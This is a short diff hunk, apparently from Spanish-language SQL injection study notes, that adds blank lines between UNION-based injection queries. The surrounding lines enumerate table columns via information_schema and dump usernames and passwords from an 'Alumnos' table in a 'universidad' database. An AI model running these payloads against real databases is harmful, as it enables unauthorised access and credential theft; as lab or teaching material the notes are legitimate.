@@ -31,6 +31,8 @@ SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT column_name, NULL 
 
 SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema="universidad" AND table_name="Alumnos" LIMIT 2,1;-- -;
 
+
+
 # LISTAR USUARIOS Y CONTRASEÑAS
 SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT concat(username,0x3a,password),NULL FROM universidad.Alumnos;-- -;
 
